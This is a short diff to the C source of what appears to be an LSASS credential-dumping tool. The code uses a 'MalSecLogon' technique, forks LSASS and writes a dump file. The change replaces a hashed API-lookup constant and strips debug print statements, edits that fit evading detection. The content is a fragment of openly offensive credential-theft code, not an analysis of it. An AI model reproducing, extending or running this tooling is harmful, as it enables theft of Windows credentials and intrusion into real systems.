@@ -3,9 +3,10 @@
 #include "handle.h"
 #include "malseclogon.h"
 
+
 typedef BOOL(WINAPI* LookupPrivilegeValueW_t) (LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
 
-#define LookupPrivilegeValueW_SW2_HASH 0x0cc75b7b
+#define LookupPrivilegeValueW_SW2_HASH 0x8c8ec318
 
 void usage(char* procname)
 {
@@ -353,7 +354,6 @@ int main(int argc, char* argv[])
 
 	if (is_malseclogon_stage_1)
 	{
-		DPRINT("is_malseclogon_stage_1");
 		success = MalSecLogon(malseclogon_target_binary, dump_path, fork_lsass, use_valid_sig, use_malseclogon_locally, lsass_pid, &created_processes);
 		if (!success)
 			return -1;
@@ -386,8 +386,6 @@ int main(int argc, char* argv[])
 	HANDLE hProcess = obtain_lsass_handle(lsass_pid, permissions, duplicate_handle, fork_lsass, is_malseclogon_stage_2, dump_path);
 	if (!hProcess)
 		return -1;
-
-	DPRINT("obtain_lsass_handle %08x", hProcess);
 
 	// if MalSecLogon was used, the handle does not have PROCESS_CREATE_PROCESS
 	if (fork_lsass && use_malseclogon)
